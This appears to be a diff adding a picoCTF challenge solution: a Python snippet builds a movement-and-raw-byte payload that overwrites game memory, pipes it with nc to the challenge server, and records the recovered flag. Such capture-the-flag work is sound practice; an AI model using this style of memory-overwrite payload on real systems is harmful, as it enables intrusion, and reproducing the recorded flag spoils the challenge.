@@ -1,0 +1,11 @@
+python3 - << 'PY' > final.txt
+payload  = b"aaaaaaaaawwwwsp" * 3
+payload += b"aaaaaaaaawwwws" + b"d"*44 + b"wl" + bytes([0x7f]) + b"w"
+payload += b"aaaaaaaaawwwws" + b"d"*44 + b"wl" + bytes([0xfe]) + b"w"
+open("final.txt", "wb").write(payload)
+print(len(payload), file=__import__("sys").stderr)
+PY
+
+cat final.txt | nc rhea.picoctf.net 58748
+
+picoCTF{gamer_leveluP_eef9a292}
